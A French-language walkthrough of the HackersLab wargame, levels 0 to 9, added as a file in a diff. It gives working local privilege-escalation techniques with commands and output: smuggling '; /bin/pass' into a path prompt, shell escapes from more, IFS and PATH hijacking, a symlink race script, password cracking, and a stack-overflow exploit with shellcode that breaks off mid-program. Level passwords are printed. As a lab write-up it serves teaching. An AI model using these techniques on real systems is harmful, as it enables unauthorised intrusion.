@@ -1,0 +1,1260 @@
+                 Solutions du challenge HackersLab
+                by virgil <virgil.hemery@wanadoo.fr>
+
+
+[ Introduction ]
+
+HackersLab propose un challenge de hacking (17 niveaux de difficulté crois-
+-sante) accessible à partir de l'adresse http://www.hackerslab.org/.
+
+Ce challenge est destiné aux personnes ayant un minimum de connaissances sur
+les réseaux, le shell bash et la programmation (et bien sûr en hacking).
+
+Le jeu consiste à se connecter (via telnet) sur drill.hackerslab.org, au dé-
+-but en tant que level0, et suivre les énoncés de problèmes et les indices
+donnés dans "View problems" afin d'augmenter ses droits d'accès et d'obtenir
+le mot de passe pour le niveau suivant (le plus souvent en executant le fi-
+-chier /bin/pass). Les niveaux sont très variés, au programme: set-uid back-
+-door, escape shell, spoofing, race condition, attaques par lien symbolique,
+stack-based & heap/bss overflow, format bug, etc =)
+
+Une fois sur le site, allez dans "Free Hacking Zone" puis suivez le lien "Re-
+-gistration" pour vous inscrire, puis allez dans "View problems" pour avoir
+des informations sur le premier niveau, level 0.
+
+
+
+############################## { Level 0 } ##################################
+
+*-----------------------------------------------------------------------*
+| It's a good thing that someone was nice enough to install a backdoor. |
+| Your task is to use this backdoor to get to the next level.  First,   |
+| telnet to drill.hackerslab.org.                                       |
+| HINT:  Start looking in the device driver directory.                  |
+*-----------------------------------------------------------------------*
+
+En gros, quelqu'un a installé une backdoor permettant de s'arroger des droits
+de level1 dans le répertoire /dev. Pour information, sur un système Unix /dev
+est le repertoire contenant des fichiers permettant l'accès aux périphériques
+ou aux terminaux. Trêve de bavardage, connectons nous maintenant par telnet
+sur drill.hackerslab.org:
+
+$ telnet drill.hackerslab.org
+Trying 203.239.110.20...
+Connected to drill.hackerslab.org (203.239.110.20).
+Escape character is '^]'.
+
+(...)
+
+Welcome to F.H.Z of Hackerslab !
+( level0/guest are first visiting account. )
+login: level0
+Password: guest
+
+[level0@drill level0]$ id
+uid=2000(level0) gid=2000(level0) groups=2000(level0)
+[level0@drill level0]$ uname
+Linux
+
+Bien, maintenant faisons le point. Nous sommes à la recherche d'une backdoor
+qui va nous donner un shell des droits de level1, à partir duquel on pourra
+executer le fichier /bin/pass pour connaître le mot de passe du niveau 1.
+Pour faire cela, notre backdoor devra d'une part appartenir à l'utilisateur
+level1 et d'autre part possèder impérativement le bit "Set-Uid".
+
+Le bit Set-Uid placé sur un fichier permet de donner, lors de l'execution du
+fichier, les droits du propriétaire de ce fichier à celui qui l'a lancé. Plus
+techniquement parlant, le bit Set-Uid va permettre d'affecter l'uid (numéro
+d'utilisateur) du propriétaire du fichier à l'euid, qui est le numéro d'uti-
+-lisateur effectif, c'est à dire le numéro d'utilisateur avec lequel le pro-
+-cessus correspondant à l'execution du fichier va fonctionner.
+
+En mode octal le bit Set-Uid est représenté par la valeur 04000. Nous n'avons
+plus qu'à nous servir de la commande find (1) pour trouver la backdoor:
+
+[level0@drill level0]$ find /dev -user level1 -perm +04000 -ls 2>/dev/null
+
+Explications: on recherche des fichiers dans le repertoire /dev appartenant à
+l'utilisateur level1 (-user level1) et possèdant le bit SUID (-perm +04000),
+et on affiche les éventuels résultats de manière détaillée (-ls). On rediri-
+-gera les possibles erreurs vers /dev/null afin de ne pas les afficher.
+
+Voilà ce qu'on obtient:
+
+198916   16 -rwsr-x---   1 level1   level0      13500 Jul  8 12:58 /dev/.hi
+
+Parfait. Vous noterez la présence du 's' dans le champ des droits d'accès, ce
+'s' trahit l'existence du bit Set-Uid sur le fichier.
+
+Executons le maintenant:
+
+[level0@drill level0]$ /dev/.hi
+[level0@drill level0]$ id
+uid=2000(level0) gid=2000(level0) euid=2001(level1) groups=2000(level0)
+
+Nous avons obtenu le numéro d'utilisateur effectif du propriétaire du fichier
+on va donc pouvoir executer /bin/pass en tant que level1:
+
+[level0@drill level0]$ /bin/pass
+-----------------------------------------------------------------------------
+                               [ LEVEL 1 ]
+-----------------------------------------------------------------------------
+                                                        ..::''''::..
+                                              .:::.   .;''        ``;.
+        ....                                  :::::  ::    ::  ::    ::
+    ,;' .;:                ()  ..:            `:::' ::     ::  ::     ::
+    ::.      ..:,:;.,:;.    .   ::   .::::.    `:'  :: .:' ::  :: `:. ::
+     '''::,   ::  ::  ::  `::   ::  ;:   .::    :   ::  :          :  ::
+   ,:';  ::;  ::  ::  ::   ::   ::  ::,::''.    .    :: `:.      .:' ::
+   `:,,,,;;' ,;; ,;;, ;;, ,;;, ,;;, `:,,,,:'   :;:    `;..``::::''..;'
+                                                        ``::,,,,::''
+
+        password : newworld
+
+-----------------------------------------------------------------------------
+
+Bien joué ! Validez maintenant le mot de passe dans "View problems" pour acc-
+-èder au problème suivant.
+
+
+
+
+
+############################## { Level 1 } ##################################
+
+*--------------------------------------------------------------------------*
+| A computer student named Matthew is doing his C-programming homework.    |
+| His teacher wanted him to create a program/script that if he types in a  |
+| path name the program gives him what type of file/drectory it is. He was |
+| able to get it easily by using the `file` utility in the Unix-based      |
+| commands.  However, the flaw lies in this solution. Use this flaw and go |
+| on to the next level. HINT-One of 12 books known as the Minor prophets   |
+*--------------------------------------------------------------------------*
+
+Dans le cadre de ses études un élève en classe d'informatique, Matthew, a
+crée un programme servant à identifier le type d'un fichier, par le biais de
+la commande 'file' (syntaxe: file [-option] file).
+
+Pour commencer reconnectons nous en telnet sur drill.hackerslab.org et re-
+-cherchons le programme en question (on suppose qu'il possède le bit Set-Uid)
+
+[level1@drill level1]$ find / -user level2 -perm +04000 -ls 2>/dev/null
+672306  16 -rwsr-x---   1 level2   level1    13987 Jul  5  2001 /usr/bin/amos
+
+On ne trouve qu'un fichier, c'est forcément le bon ! Voyons plus en détail
+son fonctionnement:
+
+[level1@drill level1]$ /usr/bin/amos
+path: /usr/bin
+/usr/bin: directory
+
+
+On spécifie, comme demandé, le chemin vers le fichier dont on souhaite con-
+-naître le type. Cela reviendrait au même de faire directement:
+
+[level1@drill level1]$ /usr/bin/file /usr/bin
+/usr/bin: directory
+
+On peut donc facilement 'voir' comment le programme a été codé:
+
+(...)
+snprintf(buffer, sizeof(buffer)-1, "/usr/bin/file %s", &path);
+system(buffer);
+(...)
+
+Le programme prend les données saisies par l'utilisateur, les donne comme ar-
+-gument à 'file' dans un buffer, puis execute le contenu du buffer par un ap-
+-pel à system(). Par exemple, si lors de la demande de saisie (path: ) on ta-
+-pe "/bin/ls" le programme executera "/usr/bin/file /bin/ls".
+
+Nous allons donc pouvoir réaliser ce que l'on appelle un "escape shell" [1]. 
+Pour comprendre cette technique, vous devez savoir que deux commandes peuvent 
+être executées successivement si on les sépare par un ';'. Lors de la saisie
+du chemin de fichier à passer comme argument à file, nous mettrons donc 
+"; /bin/pass". Le programme executera "/usr/bin/file ; /bin/pass", et comme 
+il possède le bit Set-Uid et que son propriétaire est level2, nous obtien-
+-drons le mot de passe pour le niveau 2.
+ 
+[level1@drill level1]$ /usr/bin/amos
+path: ; /bin/pass
+Usage: file [-bcnvzL] [-f namefile] [-m magicfiles] file...
+-----------------------------------------------------------------------------
+                               [ LEVEL 2 ]
+-----------------------------------------------------------------------------
+                                                        ..::''''::..
+                                              .:::.   .;''        ``;.
+      ....                                    :::::  ::    ::  ::    ::
+    ,;' .;:                ()  ..:            `:::' ::     ::  ::     ::
+    ::.      ..:,:;.,:;.    .   ::   .::::.    `:'  :: .:' ::  :: `:. ::
+     '''::,   ::  ::  ::  `::   ::  ;:   .::    :   ::  :          :  ::
+   ,:';  ::;  ::  ::  ::   ::   ::  ::,::''.    .    :: `:.      .:' ::
+   `:,,,,;;' ,;; ,;;, ;;, ,;;, ,;;, `:,,,,:'   :;:    `;..``::::''..;'
+                                                        ``::,,,,::''
+
+        password : DoItYourself
+
+-----------------------------------------------------------------------------
+
+
+
+
+
+############################## { Level 2 } ##################################
+
+*--------------------------------------------------------------------------*
+| Kevin, a BBS programmer wants to add an alert on his homepage so that    |
+| his members can see his message every time they log in.  Unfortunately,  |
+| his message is over a page long and his members cannot read the message. |
+| As a result, he has been racking his brain night and day trying to come  |
+| up with a solution. Finally, he thought of using `more` command to solve |
+| this problem.  However, this method is risky for security reasons.       |
+| Using this, go on to the next level.                                     |
+| HINT:  Nuff said!                                                        |
+*--------------------------------------------------------------------------*
+
+Un programmeur s'est servi de la commande "more" dans un programme pour affi-
+-cher un message page par page. Nous allons maintenant voir quel est le pro-
+-blème posé par l'utilisation de "more".
+Comme d'habitude, on commence par rechercher le programme en question:
+
+[level2@drill level2]$ find / -user level3 -perm +04000 -ls 2>/dev/null
+672305  16 -rwsr-x---   1 level3   level2   13469 Jul  5  2001 /usr/bin/alert
+
+On peut aussi constater la présence d'un fichier alert.txt dans le repertoire
+/usr/bin, il s'agit ni plus ni moins du fichier que le programme "alert" est
+sensé afficher.
+
+Bien, maintenant executons le programme:
+
+[level2@drill level2]$ /usr/bin/alert
+Here is Free Hacking Zone.
+
+
+Feel Free
+
+
+Think Geek!!!!
+
+
+Good Luck!!!
+
+
+
+ÀÌ°÷Àº ´ç½Å¿¡°Ô ¾Ç¿µÇâÀ» ³¢Ä¥ ¼öµµ..
+
+
+
+
+ÁÁÀº ¿µÇâÀ» ³¢Ä¥ ¼öµµ ÀÖ½À´Ï´Ù.
+
+
+
+
+--More--(45%)
+
+
+Une pression sur la touche espace nous permet d'afficher la suite du message.
+Mais ce n'est guère ce qui nous intéresse ici. La solution à ce problème se
+trouve dans une commande du programme /bin/more.
+
+En effet, en cherchant un peu dans la page de manuel de more (man 1 more) on
+trouve cela:
+
+
+(...)
+
+COMMANDS
+
+(...)
+
+     !<cmd> or :!<cmd>
+                 Execute <cmd> in a subshell
+
+(...)
+
+Pas besoin d'explications. On va donc pouvoir executer /bin/pass lors de
+l'affichage du fichier en entrant "!/bin/pass". Voyons ça:
+
+[level2@drill level2]$ /usr/bin/alert
+
+(...)
+
+!/bin/pass
+-----------------------------------------------------------------------------
+                               [ LEVEL 3 ]
+-----------------------------------------------------------------------------
+                                                        ..::''''::..
+                                              .:::.   .;''        ``;.
+      ....                                    :::::  ::    ::  ::    ::
+    ,;' .;:                ()  ..:            `:::' ::     ::  ::     ::
+    ::.      ..:,:;.,:;.    .   ::   .::::.    `:'  :: .:' ::  :: `:. ::
+     '''::,   ::  ::  ::  `::   ::  ;:   .::    :   ::  :          :  ::
+   ,:';  ::;  ::  ::  ::   ::   ::  ::,::''.    .    :: `:.      .:' ::
+   `:,,,,;;' ,;; ,;;, ;;, ,;;, ,;;, `:,,,,:'   :;:    `;..``::::''..;'
+                                                        ``::,,,,::''
+
+        password : hackerproof
+
+-----------------------------------------------------------------------------
+
+Et c'est gagné !
+
+
+
+
+
+############################## { Level 3 } ##################################
+
+*-------------------------------------------------------------------------*
+| Steven is known for his tardiness, he is never on time! He is aware of  |
+| this problem and knows that he has to do something about it.  So, he    |
+| programmed a simple C utility by using the `date` command that displays |
+| the current date in YYYY-MM-DD format every time he logs on to his      |
+| computer. He put it in a secret directory because he was worried about  |
+| others seeing this.  Find it out and get the password for the next      |
+| level.                                                                  |
+*-------------------------------------------------------------------------*
+
+OK. Steven s'est servi de la commande "date" dans un programme pour afficher
+la date courante, et a placé ce programme dans un repertoire secret.
+
+Partons donc à sa recherche:
+
+[level3@drill level3]$ find  / -user level4 -perm +04000 -print 2>/dev/null
+/usr/man/pt_BR/man8/today
+[level3@drill level3]$ /usr/man/pt_BR/man8/today
+07/21/03
+
+Cela donnerait donc la même chose que d'executer "/bin/date" en mettant comme
+argument le format +%m/%d/%y (mois, jour du mois, année):
+
+[level3@drill level3]$ date +%m/%d/%y
+07/21/03
+
+Dès lors, on comprend aisément comment marche le programme "today":
+
+int main(void)
+{
+ system("/bin/date +%m/%d/%y");
+ return 0;
+}
+
+Pour tirer partie de ce programme, l'idée serait de se servir dans un premier
+temps de la variable d'environnement IFS puis de modifier notre PATH pour
+lancer un script nommé "bin" executant "/bin/pass".
+
+La variable d'environnement IFS est une variable qui contient les caractères
+d'espacement à considérer. Exemple:
+
+[level3@drill level3]$ TODAY="/usr/man/pt_BR/man8/today"
+
+[level3@drill level3]$ echo $TODAY
+/usr/man/pt_BR/man8/today
+
+[level3@drill level3]$ IFS=/
+Ici on assigne à la variable $IFS le symbole "/".
+
+[level3@drill level3]$ echo $TODAY
+ usr man pt_BR man8 today
+
+Tous les "/" ont été remplacés par un espace. Mais revenons à notre exemple.
+
+Nous allons assigner "/" à IFS, ce qui fait que le programme "today" essayera
+d'executer " bin date +%m/%d/%y" et non plus "/bin/date +%m/%d/%y". Et s'il
+existe un programme nommé "bin" dans le repertoire courant alors il sera exe-
+-cuté. Comme nous ne disposons pas du droit d'écriture sur le repertoire
+/usr/man/pt_BR/man8 nous mettrons ce programme dans notre repertoire tempo-
+-raire (~/tmp) et nous modifierons notre $PATH de manière à faire en sorte
+qu'il soit executé. $PATH est une variable d'environnement qui contient les
+repertoires à aller visiter en premier lorsque nous désirons executer un fi-
+-chier.
+
+[level3@drill level3]$ echo $PATH
+/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/level3/bin
+
+Dans notre contexte, quand nous tapons par exemple "ls", ls système va cher-
+-cher le programme "ls" d'abord dans le repertoire /usr/local/bin, puis, s'il
+ne le trouve pas, dans /bin, puis dans /usr/bin, et ainsi de suite.
+Il nous suffira donc de créer un script "bin" dans ~/tmp, puis de mettre ce
+repertoire dans notre $PATH.
+
+[level3@drill level3]$ echo "/bin/pass" > ~/tmp/bin
+[level3@drill level3]$ chmod +x ~/tmp/bin
+[level3@drill level3]$ PATH=~/tmp
+[level3@drill level3]$ IFS=/
+[level3@drill level3]$ export IFS
+[level3@drill level3]$ /usr/man/pt_BR/man8/today
+-----------------------------------------------------------------------------
+                               [ LEVEL 4 ]
+-----------------------------------------------------------------------------
+                                                        ..::''''::..
+                                              .:::.   .;''        ``;.
+      ....                                    :::::  ::    ::  ::    ::
+    ,;' .;:                ()  ..:            `:::' ::     ::  ::     ::
+    ::.      ..:,:;.,:;.    .   ::   .::::.    `:'  :: .:' ::  :: `:. ::
+     '''::,   ::  ::  ::  `::   ::  ;:   .::    :   ::  :          :  ::
+   ,:';  ::;  ::  ::  ::   ::   ::  ::,::''.    .    :: `:.      .:' ::
+   `:,,,,;;' ,;; ,;;, ;;, ,;;, ,;;, `:,,,,:'   :;:    `;..``::::''..;'
+                                                        ``::,,,,::''
+
+        password : AreUReady?
+
+-----------------------------------------------------------------------------
+
+
+
+
+
+############################## { Level 4 } ##################################
+
+ --------------------------------------------------------------------------
+| Kevin likes playing games in Linux. One day, he was bored and had        |
+| nothing to do so he decided to play with a source file of the game.      |
+| He opened the source file and added some codes and then compiled it. Get |
+| the password for the next level by using this program.                   |
+| HINT:  Apparently, he added only one line into the source.               |
+ --------------------------------------------------------------------------
+
+Kevin s'est amusé à modifier le code source d'un jeu, puis l'a recompilé. Le
+but de ce niveau va être de se servir de ce jeu pour avoir avoir le mot de
+passe du niveau suivant. Sous GNU/Linux, les jeux sont généralement placés
+dans le repertoire /usr/games, allons voir ça.
+
+[level4@drill level4]$ cd /usr/games
+[level4@drill games]$ ls -l
+total 56
+-rwxr-xr-x    1 root     root        16880 Mar  7  2000 banner
+drwxr-xr-x    2 root     root         4096 Aug 27  2002 lib
+-rwsr-x---    1 level5   level4      30422 Jan 10  2003 trojka
+
+Parmi ces trois fichiers, seul un appartient à l'utilisateur level5, trojka,
+c'est certainement le jeu que nous recherchons:
+
+[level4@drill level4]$ ./trojka
+(l'écran se vide, on appuie sur une touche et une sorte de tetris apparaît)
+
+Dans l'énoncé du problème il nous est dit que "apparement, il a ajouté seule-
+-ment une ligne dans la source". On peut donc supposer qu'il s'agisse d'un
+system("clear");. Pour passer ce niveau, on va simplement créer un script
+"clear" executant /bin/pass dans notre ~/tmp, puis modifier notre PATH comme
+vu au niveau précédent afin que le system() execute notre script:
+
+[level4@drill games]$ echo "/bin/pass" > ~/tmp/clear
+[level4@drill games]$ PATH=~/tmp
+[level4@drill games]$ ./trojka
+-----------------------------------------------------------------------------
+                               [ LEVEL 5 ]
+-----------------------------------------------------------------------------
+                                                        ..::''''::..
+                                              .:::.   .;''        ``;.
+      ....                                    :::::  ::    ::  ::    ::
+    ,;' .;:                ()  ..:            `:::' ::     ::  ::     ::
+    ::.      ..:,:;.,:;.    .   ::   .::::.    `:'  :: .:' ::  :: `:. ::
+     '''::,   ::  ::  ::  `::   ::  ;:   .::    :   ::  :          :  ::
+   ,:';  ::;  ::  ::  ::   ::   ::  ::,::''.    .    :: `:.      .:' ::
+   `:,,,,;;' ,;; ,;;, ;;, ,;;, ,;;, `:,,,,:'   :;:    `;..``::::''..;'
+                                                        ``::,,,,::''
+
+        password : Silent night,holy night!
+
+-----------------------------------------------------------------------------
+
+
+
+
+
+############################## { Level 5 } ##################################
+
+*--------------------------------------------------------------------------*
+| A hacker named John made the backdoor for the first problem.  He got     |
+| really angry when he realized that other HackersLab members were taking  |
+| his backdoor for granted.  He had worked on it very hard for one day and |
+| now he thinks that he can feel rest assured thinking that no one else    |
+| can use the backdoor. Drive him mad again!                               |
+*--------------------------------------------------------------------------*
+
+Cette fois-ci, un "hacker", John, a placé une Set-Uid backdoor et a pris soin
+de protéger son execution par un mot de passe.
+Première étape, retrouver sa backdoor:
+
+[level5@drill level5]$ find / -user level6 -perm +04000 -print 2>/dev/null
+/lib/security/pam_auth.so
+
+Seconde étape, executer sa backdoor:
+
+[level5@drill level5]$ /lib/security/pam_auth.so
+passwd:
+passwd incorrect
+
+Dernière étape: trouver le mot de passe ! Pour cela petite séance de reverse
+engineering avec gdb (Gnu Debugger)
+
+[level5@drill level5]$ gdb -q /lib/security/pam_auth.so
+(gdb) disas main
+Dump of assembler code for function main:
+0x804852c <main>:       push   %ebp
+0x804852d <main+1>:     mov    %esp,%ebp
+0x804852f <main+3>:     sub    $0x8,%esp
+0x8048532 <main+6>:     sub    $0xc,%esp
+0x8048535 <main+9>:     push   $0x80486bf
+0x804853a <main+14>:    call   0x80483e4 <getpass>
+
+La saisie du mot de passe s'effectue avec la fonction char *getpass(const
+char *prompt). Les arguments d'une fonction sont empilés (push) avant l'ap-
+-pel de celle-ci. L'adresse 0x80486bf contient donc le prompt de getpass.
+
+(gdb) x/s 0x80486bf
+0x80486bf <l10+8>:       "passwd:"
+
+0x804853f <main+19>:    add    $0x10,%esp
+0x8048542 <main+22>:    mov    %eax,0xfffffffc(%ebp)
+0x8048545 <main+25>:    sub    $0x8,%esp
+0x8048548 <main+28>:    push   $0x8048676
+0x804854d <main+33>:    pushl  0xfffffffc(%ebp)
+0x8048550 <main+36>:    call   0x80483d4 <strcmp>
+
+Le mot de passe saisi est ensuite comparé avec le bon mot de passe par un ap-
+-pel à int strcmp(const char *s1, const char *s2). Les deux arguments de str-
+-cmp sont empilés avant le call, 0x8048676 contiendra l'adresse du password.
+
+(gdb) x/s 0x8048676
+0x8048676 <passwd>:      "Best of The Best Hackerslab"
+
+Voilà donc notre pass ;)
+
+0x8048555 <main+41>:    add    $0x10,%esp
+0x8048558 <main+44>:    mov    %eax,0xfffffff8(%ebp)
+0x804855b <main+47>:    cmpl   $0x0,0xfffffff8(%ebp)
+0x804855f <main+51>:    jne    0x8048578 <main+76>
+0x8048561 <main+53>:    sub    $0x4,%esp
+0x8048564 <main+56>:    push   $0x0
+0x8048566 <main+58>:    push   $0x80486c7
+0x804856b <main+63>:    push   $0x80486ca
+0x8048570 <main+68>:    call   0x80483b4 <execl>
+
+(gdb) x/s 0x80486c7
+0x80486c7 <l10+16>:      "sh"
+(gdb) x/s 0x80486ca
+0x80486ca <l10+19>:      "/bin/sh"
+
+Si le mot de passe saisi correspond au bon (i.e. si strcmp renvoie 0), alors
+on execute un shell (/bin/sh) par le biais d'execl().
+
+0x8048575 <main+73>:    add    $0x10,%esp
+0x8048578 <main+76>:    sub    $0xc,%esp
+0x804857b <main+79>:    push   $0x80486d2
+0x8048580 <main+84>:    call   0x8048424 <printf>
+0x8048585 <main+89>:    add    $0x10,%esp
+0x8048588 <main+92>:    sub    $0xc,%esp
+0x804858b <main+95>:    push   $0x1
+0x804858d <main+97>:    call   0x8048404 <sleep>
+0x8048592 <main+102>:   add    $0x10,%esp
+0x8048595 <main+105>:   leave
+0x8048596 <main+106>:   ret
+
+(gdb) x/s 0x80486d2
+0x80486d2 <l10+27>:      "passwd incorrect\n"
+
+Sinon on renvoie un message d'erreur et on suspend (sleep) l'execution du
+programme pendant une seconde, après quoi le programme se termine.
+
+Finalement voilà un code source C approximatif du programme:
+
+int main(void)
+{
+ char *saisie;
+ char *passwd="Best of The Best Hackerslab";
+ saisie=(char *)getpass("passwd: ");
+ if(!strcmp(saisie,passwd))
+ execl("/bin/sh","sh",0);
+ else { printf("passwd incorrect\n");
+        sleep(1);
+      }
+ return 0;
+}
+
+[level5@drill level5]$ /lib/security/pam_auth.so
+passwd:
+[level5@drill level5]$ id
+uid=2005(level5) gid=2005(level5) euid=2006(level6) groups=2005(level5)
+[level5@drill level5]$ /bin/pass
+-----------------------------------------------------------------------------
+                               [ LEVEL 6 ]
+-----------------------------------------------------------------------------
+                                                        ..::''''::..
+                                              .:::.   .;''        ``;.
+      ....                                    :::::  ::    ::  ::    ::
+    ,;' .;:                ()  ..:            `:::' ::     ::  ::     ::
+    ::.      ..:,:;.,:;.    .   ::   .::::.    `:'  :: .:' ::  :: `:. ::
+     '''::,   ::  ::  ::  `::   ::  ;:   .::    :   ::  :          :  ::
+   ,:';  ::;  ::  ::  ::   ::   ::  ::,::''.    .    :: `:.      .:' ::
+   `:,,,,;;' ,;; ,;;, ;;, ,;;, ,;;, `:,,,,:'   :;:    `;..``::::''..;'
+                                                        ``::,,,,::''
+
+        password : Best of The Best Hackerslab
+
+-----------------------------------------------------------------------------
+
+
+
+
+
+############################## { Level 6 } ##################################
+
+*--------------------------------------------------------------------------*
+| On behalf of all those who have worked hard to reach this level, we have |
+|opened a port for you so that you could get the password easily.  But     |
+| oops I don't remember the port number.  Sorry :p                         |
+*--------------------------------------------------------------------------*
+
+Cette fois-ci il s'agit d'un service en veille sur lequel nous devrons nous
+connecter pour avoir le mot de passe du niveau 7. Le problème est que nous
+ne connaissons pas le port sur lequel tourne ce service !
+Sous GNU/Linux, le fichier /etc/services contient la liste des services et
+leur numéro de port correspondant. Vérifions donc son contenu
+
+[level6@drill level6]$ more /etc/services
+
+(...)
+
+# Local services
+
+linuxconf       98/tcp
+pspd            6969/tcp                        #level problem port
+qc              100/tcp                         #level problem port
+usd             5555/udp                        #level udp spoofing..port
+
+
+Les ports qui vont nous interesser sont ceux commentés "level problem port".
+Il y en a deux: 6969 (pspd) et 100 (qc).
+Tentons une connection par telnet sur le port 6969 de drill.hackerslab.org:
+
+$ telnet drill.hackerslab.org 6969
+Trying 203.239.110.20...
+Connected to drill.hackerslab.org (203.239.110.20).
+Escape character is '^]'.
+
+(...)
+
+Welcome to F.H.Z of Hackerslab !
+( level0/guest are first visiting account. )
+level6's passwd:
+'Best of The Best Hackerslab'
+Congratulation!! level7's passwd is 'Cant help falling in love'
+Connection closed by foreign host.
+
+Bingo!
+
+
+
+
+
+############################## { Level 7 } ##################################
+
+*--------------------------------------------------------------------------*
+| There is an executable file somewhere that holds the password for the    |
+| next level. Unfortunately, it isn't easy to find.  You have to figure it |
+| out by yourself this time.                                               |
+*--------------------------------------------------------------------------*
+
+Bien, cherchons d'abord ce fichier:
+
+[level7@drill level7]$ find / -user level8 -perm +04000 -ls 2>/dev/null
+198918   16 -rwsr-x---   1 level8   level7      13785 Aug 27  2002 /dev/audio2
+
+Puis essayons de l'executer:
+
+[level7@drill level7]$ /dev/audio2
+VoE4HoQCFfMW2
+ shadowÆÄÀÏÀÇ level8 ÆÐ½º¿öµå ºÎºÐÀÌ´Ù.
+
+A première vue c'est du charabia ! VoE4HoQCFfMW2 ressemble au hash d'un mot
+de passe, essayons donc de le brute-forcer avec John the Ripper (et une bon-
+-ne wordlist). Pour cela il faut créer un fichier passwd qui pourra être lu
+par john, la structure d'un fichier de ce type est la suivante:
+
+utilisateur:hash:uid:gid:commentaires:repertoire:shell
+
+$ echo "root:VoE4HoQCFfMW2:0:0:hackerslab:/root:/bin/bash" > hackerslab
+
+Executons maintenant John. Son fonctionnement est simple. Il parcoure et en-
+-crypte les mots d'une wordlist, puis compare le hash de chaque mot avec ce-
+-lui du fichier passwd à cracker, s'il y a correspondance le mot est affiché.
+
+$ ./john -w:password.lst hackerslab
+Loaded 1 password (Standard DES [24/32 4K])
+wonderfu         (root)
+guesses: 1  time: 0:00:00:00 100%  c/s: 2290  trying: republic - zhongguo
+
+John nous sort le mot "wonderfu", "wonderful" serait plus adapté ! (en an-
+-glais, wonderful signifie merveilleux). On essaye donc et ça fonctionne :)
+
+
+
+
+
+############################## { Level 8 } ##################################
+
+*-------------------------------------------------------------------------*
+| This problem requires a good understanding of hacking techniques.  Use  |
+| the technique to the /usr/bin/ps2 , which was implemented by the famous |
+| 8lgm hackers club, in order to get the password to the next level.      |
+| HINT:  A temporary file will be created in var/tmp2.                    |
+*-------------------------------------------------------------------------*
+
+Il s'agit dans ce niveau de mettre en oeuvre un "race condition" [2] en cré-
+-ant au bon moment un lien symbolique entre /bin/pass et /var/tmp2/ps2.tmp
+(qui est le fichier temporaire utilisé par /usr/bin/ps2). Au moment ou /usr
+/bin/ps2 voudra lire ce fichier, /bin/pass sera executé. Pour mener à bien
+cette attaque nous devrons créer une boucle infinie qui répetera l'opération
+jusqu'a ce que l'on obtienne le mot de passe. Faisons un script (vim race):
+
+*****************************************************************************
+#!/bin/sh
+while true
+do
+/usr/bin/ps2 &
+rm -f /var/tmp2/ps2.tmp
+ln -sf /bin/pass /var/tmp2/ps2.tmp
+done
+*****************************************************************************
+
+Rendons le executable et lançons le (grep -i password pour afficher unique-
+-ment ce qui contiendra le mot "password", en ignorant la casse des lettres):
+
+[level8@drill level8]$ chmod +x race
+[level8@drill level8]$ rm -f /var/tmp2/ps2.tmp
+[level8@drill level8]$ ./race | grep -i password
+rm: cannot unlink `/var/tmp2/ps2.tmp': Operation not permitted
+ln: cannot remove `/var/tmp2/ps2.tmp': Operation not permitted
+level9 Password is  !secu!
+<Ctrl-C>
+
+Le tour est joué !
+
+
+
+
+
+############################## { Level 9 } ##################################
+
+*-----------------------------------------------------------*
+| What happens when you forget to perform `bound checking`? |
+| HINT: /etc/bof                                            |
+*-----------------------------------------------------------*
+
+La clé de ce niveau se situe donc dans le fichier /etc/bof, qui, comme son
+nom l'indique, est vulnérable à un "buffer overflow", vérifions:
+
+[level9@drill level9]$ ls -l /etc/bof
+-rws--x---    1 level10  level9      13577 Jul 10  2001 /etc/bof
+[level9@drill level9]$ /etc/bof
+usage : /etc/bof your_nick_name
+[level9@drill level9]$ /etc/bof virgil
+hello~ virgil
+[level9@drill level9_tmp]$ /etc/bof `perl -e 'print "A"x100'`
+hello~ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+
+Nous sommes donc bien confrontés à une situation de buffer overflow. Un buf-
+-fer overflow se produit lorsqu'on cherche à faire rentrer dans un buffer
+plus de caractères qu'il ne peut en contenir. Cela est possible à partir du
+moment ou on utilise des fonctions telles que strcpy() ou gets() (ou scanf()
+quand on utilise pas les bounds checking, ce qui est le cas dans ce niveau)
+qui ne contrôlent pas la taille des données à copier dans un buffer.
+Ces données vont alors déborder sur le buffer et écraser les régions mémoire
+qui se trouvent après. Il est alors possible de réecrire l'adresse de retour
+de façon à la faire pointer sur l'adresse d'un code assembleur (shellcode),
+qui se chargera le plus souvent de nous donner un shell (des mêmes droits que
+ceux du propriétaire du programme si ce dernier possède le bit Set-Uid).
+
+Ainsi on a: [    buffer     ][ %ebp ][  %eip  ]
+
+On construira donc une chaîne d'exploitation de la forme:
+
+            [NOPS][SHELLCODE][OFFSET][RET ADDR]
+
+Le but étant d'atteindre le registre %eip (qui pointe sur la prochaine ins-
+-truction à executer) pour y injecter l'adresse du buffer (ou on mettra no-
+-tre shellcode, les NOPs sont placés avant le shellcode auquel cas si le pro-
+-gramme ne retourne pas au même endroit, le shellcode aura tout de même une
+chance d'être executé).
+
+Cependant pour augmenter nos chances de réussite nous préfererons placer le
+shellcode dans une variable d'environnement et utiliser l'adresse de cette
+variable en mémoire pour faire déborder le buffer. L'avantage est qu'ainsi,
+on pourra mettre autant de nops que l'on souhaite avant le shellcode dans la
+variable d'environnement.
+
+Pour calculer l'adresse du buffer, on récuperera l'adresse du début de la pi-
+-le. Il faut en effet savoir que pour tout les programmes, la pile commence à
+peu près à la même adresse. Quelques fois il nous faudra trouver l'offset en-
+-tre le début de la pile et l'adresse du buffer à faire déborder.
+
+Nous utiliserons l'exploit générique pour les "small buffer overflow" de
+l'article d'Aleph1 "Smashing the stack for fun and profit" [3].
+
+*****************************************************************************
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE              85
+#define DEFAULT_EGG_SIZE               2048
+#define NOP                            0x90
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_esp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+int main(int argc, char *argv[]) {
+  char *buff, *ptr, *egg;
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i, eggsize=DEFAULT_EGG_SIZE;
+
